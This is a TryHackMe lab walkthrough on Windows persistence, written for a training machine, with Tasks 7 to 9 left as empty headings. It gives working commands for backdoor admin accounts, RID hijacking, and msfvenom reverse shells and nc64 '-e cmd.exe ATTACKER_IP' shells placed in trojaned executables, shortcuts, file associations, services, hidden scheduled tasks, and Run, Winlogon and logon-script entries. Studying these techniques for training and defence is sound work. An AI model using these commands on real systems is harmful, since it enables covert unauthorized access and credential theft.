# [Windows Local Persistence](https://tryhackme.com/r/room/windowslocalpersistence)

![WindowsLocalPersistence](./images/WindowsLocalPersistence.png)

## Task 1 - Introduction

![task1-logo](./images/task1-logo.png)

After gaining the first foothold on your target's internal network, you'll want to ensure you don't lose access to it before actually getting to the crown jewels. Establishing persistence is one of the first tasks we'll have as attackers when gaining access to a network. In simple terms, persistence refers to creating alternate ways to regain access to a host without going through the exploitation phase all over again.
Backdoored Phone

![task1-logo2](./images/task1-logo2.png)

There are many reasons why you'd want to establish persistence as quick as possible, including:

* **Re-exploitation isn't always possible**: Some unstable exploits might kill the vulnerable process during exploitation, getting you a single shot at some of them.
* **Gaining a foothold is hard to reproduce**: For example, if you used a phishing campaign to get your first access, repeating it to regain access to a host is simply too much work. Your second campaign might also not be as effective, leaving you with no access to the network.
* **The blue team is after you**: Any vulnerability used to gain your first access might be patched if your actions get detected. You are in a race against the clock!

While you could do with keeping some administrator's password hash and reusing it to connect back, you always risk those credentials getting rotated at some point. Plus, there are sneakier ways in which you could regain access to a compromised machine, making life harder for the blue team.

In this room, we'll look at the most common techniques attackers use to establish persistence in Windows systems. Before going into this room, it is recommended to be familiar with Windows systems fundamentals. You can check rooms on the matter in the following links:

* [Windows Fundamentals 1](https://tryhackme.com/room/windowsfundamentals1xbx)
* [Windows Fundamentals 2](https://tryhackme.com/room/windowsfundamentals2x0x)

Powershell is also used extensively throughout this room. You can learn more about it in the [Hacking with Powershell](https://tryhackme.com/room/powershell) room.

### Answer the questions below

* Click and continue learning!

## Task 2 - Tampering With Unprivileged Accounts

Having an administrator's credential would be the easiest way to achieve persistence in a machine. However, to make it harder for the blue team to detect us, we can manipulate unprivileged users, which usually won't be monitored as much as administrators, and grant them administrative privileges somehow.

Click the **Start Machine** button on this task before continuing. The machine will be available on your web browser, but if you prefer connecting via RDP, you can use the following credentials:

![task2-account1](./images/task2-account1.png)

**Note**: When you log in via RDP, the existing in-browser view will be disconnected. After you terminate your RDP session you can get the in-browser view back by pressing **Reconnect**.

Notice that we assume you have already gained administrative access somehow and are trying to establish persistence from there.

### Assign Group Memberships

For this part of the task, we will assume you have dumped the password hashes of the victim machine and successfully cracked the passwords for the unprivileged accounts in use.

The direct way to make an unprivileged user gain administrative privileges is to make it part of the **Administrators** group. We can easily achieve this with the following command:

```
net localgroup administrators thmuser0 /add
```

![task2-add-admin](./images/task2-add-admin.png)

This will allow you to access the server by using RDP, WinRM or any other remote administration service available.

If this looks too suspicious, you can use the **Backup Operators** group. Users in this group won't have administrative privileges but will be allowed to read/write any file or registry key on the system, ignoring any configured DACL. This would allow us to copy the content of the SAM and SYSTEM registry hives, which we can then use to recover the password hashes for all the users, enabling us to escalate to any administrative account trivially.

To do so, we begin by adding the account to the Backup Operators group:

```
net localgroup "Backup Operators" thmuser1 /add
```

![task2-add-operator](./images/task2-add-operator.png)

Since this is an unprivileged account, it cannot RDP or WinRM back to the machine unless we add it to the **Remote Desktop Users** (RDP) or **Remote Management Users** (WinRM) groups. We'll use WinRM for this task:

```
net localgroup "Remote Management Users" thmuser1 /add
```

![task2-add-remot-user](./images/task2-add-remot-user.png)

We'll assume we have already dumped the credentials on the server and have thmuser1's password. Let's connect via WinRM using its credentials:

![task2-account2](./images/task2-account2.png)

If you tried to connect right now from your attacker machine, you'd be surprised to see that even if you are on the Backups Operators group, you wouldn't be able to access all files as expected. A quick check on our assigned groups would indicate that we are a part of Backup Operators, but the group is disabled:

![task2-evil-winrm](./images/task2-evil-winrm.png)

This is due to User Account Control (UAC). One of the features implemented by UAC, **LocalAccountTokenFilterPolicy**, strips any local account of its administrative privileges when logging in remotely. While you can elevate your privileges through UAC from a graphical user session (Read more on UAC [here](https://tryhackme.com/room/windowsfundamentals1xbx)), if you are using WinRM, you are confined to a limited access token with no administrative privileges.

To be able to regain administration privileges from your user, we'll have to disable LocalAccountTokenFilterPolicy by changing the following registry key to 1:

```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

![task2-registry](./images/task2-registry.png)

Once all of this has been set up, we are ready to use our backdoor user. First, let's establish a WinRM connection and check that the Backup Operators group is enabled for our user:

![task2-evil-winrm2](./images/task2-evil-winrm2.png)

We then proceed to make a backup of SAM and SYSTEM files and download them to our attacker machine:

![task2-sam-system](./images/task2-sam-system.png)

**Note**: If Evil-WinRM takes too long to download the files, feel free to use any other transfer method.

With those files, we can dump the password hashes for all users using `secretsdump.py` or other similar tools:

![task2-secretsdump](./images/task2-secretsdump.png)

And finally, perform Pass-the-Hash to connect to the victim machine with Administrator privileges:

![task2-pass-the-hash](./images/task2-pass-the-hash.png)

### Special Privileges and Security Descriptors

A similar result to adding a user to the Backup Operators group can be achieved without modifying any group membership. Special groups are only special because the operating system assigns them specific privileges by default. **Privileges** are simply the capacity to do a task on the system itself. They include simple things like having the capabilities to shut down the server up to very privileged operations like being able to take ownership of any file on the system. A complete list of available privileges can be found [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) for reference.

In the case of the Backup Operators group, it has the following two privileges assigned by default:

* **SeBackupPrivilege**: The user can read any file in the system, ignoring any DACL in place.
* **SeRestorePrivilege**: The user can write any file in the system, ignoring any DACL in place.

We can assign such privileges to any user, independent of their group memberships. To do so, we can use the `secedit` command. First, we will export the current configuration to a temporary file:

```
secedit /export /cfg config.inf
```

We open the file and add our user to the lines in the configuration regarding the SeBackupPrivilege and SeRestorePrivilege:

![task2-config](./images/task2-config.png)

We finally convert the .inf file into a .sdb file which is then used to load the configuration back into the system:

```
secedit /import /cfg config.inf /db config.sdb

secedit /configure /db config.sdb /cfg config.inf
```

You should now have a user with equivalent privileges to any Backup Operator. The user still can't log into the system via WinRM, so let's do something about it. Instead of adding the user to the Remote Management Users group, we'll change the security descriptor associated with the WinRM service to allow thmuser2 to connect. Think of a **security descriptor** as an ACL but applied to other system facilities.

To open the configuration window for WinRM's security descriptor, you can use the following command in Powershell (you'll need to use the GUI session for this):

```
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

This will open a window where you can add thmuser2 and assign it full privileges to connect to WinRM:

![task2-permission](./images/task2-permission.png)

Once we have done this, our user can connect via WinRM. Since the user has the SeBackup and SeRestore privileges, we can repeat the steps to recover the password hashes from the SAM and connect back with the Administrator user.

Notice that for this user to work with the given privileges fully, you'd have to change the **LocalAccountTokenFilterPolicy** registry key, but we've done this already to get the previous flag.

If you check your user's group memberships, it will look like a regular user. Nothing suspicious at all!

![task2-group](./images/task2-group.png)

Once again, we'll assume we have already dumped the credentials on the server and have thmuser2's password. Let's connect with its credentials using WinRM:

![task2-account3](./images/task2-account3.png.png)

We can log in with those credentials to obtain the flag.

![task2-flag2](./images/task2-flag2.png)

### RID Hijacking

Another method to gain administrative privileges without being an administrator is changing some registry values to make the operating system think you are the Administrator.

When a user is created, an identifier called **Relative ID (RID)** is assigned to them. The RID is simply a numeric identifier representing the user across the system. When a user logs on, the LSASS process gets its RID from the SAM registry hive and creates an access token associated with that RID. If we can tamper with the registry value, we can make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts.

In any Windows system, the default Administrator account is assigned the **RID = 500**, and regular users usually have **RID >= 1000**.

To find the assigned RIDs for any user, you can use the following command:

```
wmic useraccount get name,sid
```

![task2-wmic](./images/task2-wmic.png)

The RID is the last bit of the SID (1010 for thmuser3 and 500 for Administrator). The SID is an identifier that allows the operating system to identify a user across a domain, but we won't mind too much about the rest of it for this task.

Now we only have to assign the RID=500 to thmuser3. To do so, we need to access the SAM using Regedit. The SAM is restricted to the SYSTEM account only, so even the Administrator won't be able to edit it. To run Regedit as SYSTEM, we will use psexec, available in `C:\tools\pstools` in your machine:

![task2-psexec](./images/task2-psexec.png)

From Regedit, we will go to `HKLM\SAM\SAM\Domains\Account\Users\` where there will be a key for each user in the machine. Since we want to modify thmuser3, we need to search for a key with its RID in hex (1010 = 0x3F2). Under the corresponding key, there will be a value called **F**, which holds the user's effective RID at position 0x30:

![task2-regedit](./images/task2-regedit.png)

Notice the RID is stored using little-endian notation, so its bytes appear reversed.

We will now replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F401):

![task2-value](./images/task2-value.png)

The next time thmuser3 logs in, LSASS will associate it with the same RID as Administrator and grant them the same privileges.

For this task, we assume you have already compromised the system and obtained the password for thmuser3. For your convenience, the user can connect via RDP with the following credentials:

![task2-account4](./images/task2-account4.png)

If you did everything correctly, you should be logged in to the Administrator's desktop. 


**Note**: When you log in via RDP, the existing in-browser view will be disconnected. After you terminate your RDP session you can get the in-browser view back by pressing **Reconnect**.

![task2-flag3](./images/task2-flag3.png)

### Answer the questions below

* Insert flag1 here

* Insert flag2 here

* Insert flag3 here

## Task 3 - Backdooring Files

Another method of establishing persistence consists of tampering with some files we know the user interacts with regularly. By performing some modifications to such files, we can plant backdoors that will get executed whenever the user accesses them. Since we don't want to create any alerts that could blow our cover, the files we alter must keep working for the user as expected.

While there are many opportunities to plant backdoors, we will check the most commonly used ones.

### Executable Files

If you find any executable laying around the desktop, the chances are high that the user might use it frequently. Suppose we find a shortcut to PuTTY lying around. If we checked the shortcut's properties, we could see that it (usually) points to `C:\Program Files\PuTTY\putty.exe`. From that point, we could download the executable to our attacker's machine and modify it to run any payload we wanted.

You can easily plant a payload of your preference in any .exe file with `msfvenom`. The binary will still work as usual but execute an additional payload silently by adding an extra thread in your binary. To create a backdoored putty.exe, we can use the following command:

```
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

The resulting puttyX.exe will execute a reverse_tcp meterpreter payload without the user noticing it. While this method is good enough to establish persistence, let's look at other sneakier techniques.

### Shortcut Files

If we don't want to alter the executable, we can always tamper with the shortcut file itself. Instead of pointing directly to the expected executable, we can change it to point to a script that will run a backdoor and then execute the usual program normally.

For this task, let's check the shortcut to **calc** on the Administrator's desktop. If we right-click it and go to properties, we'll see where it is pointing:

![task3-calc](./images/task3-calc.png)

Before hijacking the shortcut's target, let's create a simple Powershell script in `C:\Windows\System32` or any other sneaky location. The script will execute a reverse shell and then run calc.exe from the original location on the shortcut's properties:

```
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
```

Finally, we'll change the shortcut to point to our script. Notice that the shortcut's icon might be automatically adjusted while doing so. Be sure to point the icon back to the original executable so that no visible changes appear to the user. We also want to run our script on a hidden window, for which we'll add the `-windowstyle hidden` option to Powershell. The final target of the shortcut would be:

```
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```

![task3-calc-backdoor](./images/task3-calc-backdoor.png)

Let's start an nc listener to receive our reverse shell on our attacker's machine:


![task3-listener](./images/task3-listener.png)
     
If you double-click the shortcut, you should get a connection back to your attacker's machine. Meanwhile, the user will get a calculator just as expected by them. You will probably notice a command prompt flashing up and disappearing immediately on your screen. A regular user might not mind too much about that, hopefully. 

![task3-flag](./images/task3-flag.png)

### Hijacking File Associations

In addition to persisting through executables or shortcuts, we can hijack any file association to force the operating system to run a shell whenever the user opens a specific file type.

The default operating system file associations are kept inside the registry, where a key is stored for every single file type under `HKLM\Software\Classes\`. Let's say we want to check which program is used to open .txt files; we can just go and check for the `.txt` subkey and find which **Programmatic ID (ProgID)** is associated with it. A ProgID is simply an identifier to a program installed on the system. For .txt files, we will have the following ProgID:

![task3-registry](./images/task3-registry.png)

We can then search for a subkey for the corresponding ProgID (also under `HKLM\Software\Classes\`), in this case, `txtfile`, where we will find a reference to the program in charge of handling .txt files. Most ProgID entries will have a subkey under `shell\open\command` where the default command to be run for files with that extension is specified:

![task3-registry-progid.png](./images/task3-registry-progid.png)

In this case, when you try to open a .txt file, the system will execute `%SystemRoot%\system32\NOTEPAD.EXE %1`, where `%1` represents the name of the opened file. If we want to hijack this extension, we could replace the command with a script that executes a backdoor and then opens the file as usual. First, let's create a ps1 script with the following content and save it to `C:\Windows\backdoor2.ps1`:

```
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

Notice how in Powershell, we have to pass `$args[0]` to notepad, as it will contain the name of the file to be opened, as given through `%1`.

Now let's change the registry key to run our backdoor script in a hidden window:

![task3-backdoor-progid](./images/task3-backdoor-progid.png)

Finally, create a listener for your reverse shell and try to open any .txt file on the victim machine (create one if needed). You should receive a reverse shell with the privileges of the user opening the file.

![task3-flag2](./images/task3-flag2.png)

### Answer the questions below

* Insert flag5 here

* Insert flag6 here

## Task 4 - Abusing Services

Windows services offer a great way to establish persistence since they can be configured to run in the background whenever the victim machine is started. If we can leverage any service to run something for us, we can regain control of the victim machine each time it is started.

A service is basically an executable that runs in the background. When configuring a service, you define which executable will be used and select if the service will automatically run when the machine starts or should be manually started.

There are two main ways we can abuse services to establish persistence: either create a new service or modify an existing one to execute our payload.

### Creating backdoor services

We can create and start a service named "THMservice" using the following commands:

```
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice
```

**Note**: There must be a space after each equal sign for the command to work.

The "net user" command will be executed when the service is started, resetting the Administrator's password to `Passwd123`. Notice how the service has been set to start automatically (start= auto), so that it runs without requiring user interaction.

Resetting a user's password works well enough, but we can also create a reverse shell with msfvenom and associate it with the created service. Notice, however, that service executables are unique since they need to implement a particular protocol to be handled by the system. If you want to create an executable that is compatible with Windows services, you can use the `exe-service` format in msfvenom:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
```        

You can then copy the executable to your target system, say in `C:\Windows` and point the service's binPath to it:

sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2

This should create a connection back to your attacker's machine.

![task4-flag](./images/task4-flag.png)

### Modifying existing services

While creating new services for persistence works quite well, the blue team may monitor new service creation across the network. We may want to reuse an existing service instead of creating one to avoid detection. Usually, any disabled service will be a good candidate, as it could be altered without the user noticing it.

You can get a list of available services using the following command:

```
sc.exe query state=all
```
![task4-sc](./images/task4-sc.png)       

You should be able to find a stopped service called THMService3. To query the service's configuration, you can use the following command:

![task4-thmservice3](./images/task4-thmservice3.png)

There are three things we care about when using a service for persistence:

* The executable (**BINARY_PATH_NAME**) should point to our payload.
* The service **START_TYPE** should be automatic so that the payload runs without user interaction.
* The **SERVICE_START_NAME**, which is the account under which the service will run, should preferably be set to **LocalSystem** to gain SYSTEM privileges.

Let's start by creating a new reverse shell with msfvenom:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
```

To reconfigure "THMservice3" parameters, we can use the following command:

```
sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
```     

You can then query the service's configuration again to check if all went as expected:

![task4-flag2](./images/task4-flag2.png)

### Answer the questions below

* Insert flag7 here

* Insert flag8 here

## Task 5 - Abusing Scheduled Tasks

We can also use scheduled tasks to establish persistence if needed. There are several ways to schedule the execution of a payload in Windows systems. Let's look at some of them:

### Task Scheduler

The most common way to schedule tasks is using the built-in **Windows task scheduler**. The task scheduler allows for granular control of when your task will start, allowing you to configure tasks that will activate at specific hours, repeat periodically or even trigger when specific system events occur. From the command line, you can use `schtasks` to interact with the task scheduler. A complete reference for the command can be found on [Microsoft's website](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks).

Let's create a task that runs a reverse shell every single minute. In a real-world scenario, you wouldn't want your payload to run so often, but we don't want to wait too long for this room:
Command Prompt

```
schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
```

**Note**: Be sure to use `THM-TaskBackdoor` as the name of your task, or you won't get the flag.

The previous command will create a "THM-TaskBackdoor" task and execute an `nc64` reverse shell back to the attacker. The `/sc` and `/mo` options indicate that the task should be run every single minute. The `/ru` option indicates that the task will run with SYSTEM privileges.

To check if our task was successfully created, we can use the following command:
Command Prompt

```
schtasks /query /tn thm-taskbackdoor
```

![task5-schtask](./images/task5-schtask.png)

### Making Our Task Invisible

Our task should be up and running by now, but if the compromised user tries to list its scheduled tasks, our backdoor will be noticeable. To further hide our scheduled task, we can make it invisible to any user in the system by deleting its **Security Descriptor (SD)**. The security descriptor is simply an ACL that states which users have access to the scheduled task. If your user isn't allowed to query a scheduled task, you won't be able to see it anymore, as Windows only shows you the tasks that you have permission to use. Deleting the SD is equivalent to disallowing all users' access to the scheduled task, including administrators.

The security descriptors of all scheduled tasks are stored in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`. You will find a registry key for every task, under which a value named "SD" contains the security descriptor. You can only erase the value if you hold SYSTEM privileges.

To hide our task, let's delete the SD value for the "THM-TaskBackdoor" task we created before. To do so, we will use `psexec` (available in `C:\tools`) to open Regedit with SYSTEM privileges:

```
c:\tools\pstools\PsExec64.exe -s -i regedit
```

We will then delete the security descriptor for our task:

![task5-registry](./images/task5-registry.png)

If we try to query our service again, the system will tell us there is no such task:

```
schtasks /query /tn thm-taskbackdoor ERROR: The system cannot find the file specified.
```

If we start an nc listener in our attacker's machine, we should get a shell back after a minute:

![task5-flag](./images/task5-flag.png)

### Answer the questions below

* Insert flag9 here

## Task 6 - Logon Triggered Persistence

Some actions performed by a user might also be bound to executing specific payloads for persistence. Windows operating systems present several ways to link payloads with particular interactions. This task will look at ways to plant payloads that will get executed when a user logs into the system.

### Startup folder

Each user has a folder under `C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` where you can put executables to be run whenever the user logs in. An attacker can achieve persistence just by dropping a payload in there. Notice that each user will only run whatever is available in their folder.

If we want to force all users to run a payload while logging in, we can use the folder under `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` in the same way.

For this task, let's generate a reverse shell payload using msfvenom:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
```

We will then copy our payload into the victim machine. You can spawn an `http.server` with Python3 and use wget on the victim machine to pull your file:

![task6-http](./images/task6-http.png)

We then store the payload into the `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` folder to get a shell back for any user logging into the machine.

```
copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

Now be sure to sign out of your session from the start menu (closing the RDP window is not enough as it leaves your session open):

![task6-lock](./images/task6-lock.png)

And log back via RDP. You should immediately receive a connection back to your attacker's machine.

![task6-flag](./images/task6-flag.png)

### Run / RunOnce

You can also force a user to execute a program on logon via the registry. Instead of delivering your payload into a specific directory, you can use the following registry entries to specify applications to run at logon:

* HKCU\Software\Microsoft\Windows\CurrentVersion\Run
* HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
* HKLM\Software\Microsoft\Windows\CurrentVersion\Run
* HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

The registry entries under `HKCU` will only apply to the current user, and those under `HKLM` will apply to everyone. Any program specified under the `Run` keys will run every time the user logs on. Programs specified under the `RunOnce` keys will only be executed a single time.

For this task, let's create a new reverse shell with msfvenom:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe
```

After transferring it to the victim machine, let's move it to `C:\Windows\`:

```
move revshell.exe C:\Windows
```

Let's then create a REG_EXPAND_SZ registry entry under HKLM\Software\Microsoft\Windows\CurrentVersion\Run. The entry's name can be anything you like, and the value will be the command we want to execute.

**Note**: While in a real-world set-up you could use any name for your registry entry, for this task you are required to use `MyBackdoor` to receive the flag.

![task6-registry](./images/task6-registry.png)

After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10-20 seconds).

![task6-flag2](./images/task6-flag2.png)

### Winlogon

Another alternative to automatically start programs on logon is abusing Winlogon, the Windows component that loads your user profile right after authentication (amongst other things).

Winlogon uses some registry keys under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` that could be interesting to gain persistence:

* `Userinit` points to `userinit.exe`, which is in charge of restoring your user profile preferences.
* `shell` points to the system's shell, which is usually `explorer.exe`.

![task6-registry-winlogon](./images/task6-registry-winlogon.png)

If we'd replace any of the executables with some reverse shell, we would break the logon sequence, which isn't desired. Interestingly, you can append commands separated by a comma, and Winlogon will process them all.

Let's start by creating a shell:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4452 -f exe -o revshell.exe
```

We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. In this case, we will use `C:\Windows`:

```
move revshell.exe C:\Windows
```

We then alter either `shell` or `Userinit` in `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`. In this case we will use `Userinit`, but the procedure with `shell` is the same.

**Note**: While both `shell` and `Userinit` could be used to achieve persistence in a real-world scenario, to get the flag in this room, you will need to use `Userinit`.

![task6-registry-backdoor](./images/task6-registry-backdoor.png)

After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).

![task6-flag3](./images/task6-flag3.png)

### Logon scripts

One of the things `userinit.exe` does while loading your user profile is to check for an environment variable called `UserInitMprLogonScript`. We can use this environment variable to assign a logon script to a user that will get run when logging into the machine. The variable isn't set by default, so we can just create it and assign any script we like.

Notice that each user has its own environment variables; therefore, you will need to backdoor each separately.

Let's first create a reverse shell to use for this technique:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4453 -f exe -o revshell.exe
```

We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. In this case, we will use `C:\Windows`:

```
move revshell.exe C:\Windows
```

To create an environment variable for a user, you can go to its `HKCU\Environment` in the registry. We will use the `UserInitMprLogonScript` entry to point to our payload so it gets loaded when the users logs in:

![task6-backdoor-env](./images/task6-backdoor-env.png)

Notice that this registry key has no equivalent in `HKLM`, making your backdoor apply to the current user only.

After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).

![task6-flag4](./images/task6-flag4.png)

### Answer the questions below

* Insert flag10 here

* Insert flag11 here

* Insert flag12 here

* Insert flag13 here

## Task 7 - Backdooring the Login Screen / RDP


## Task 8 - Persisting Through Existing Services


## Task 9 - Conclusion
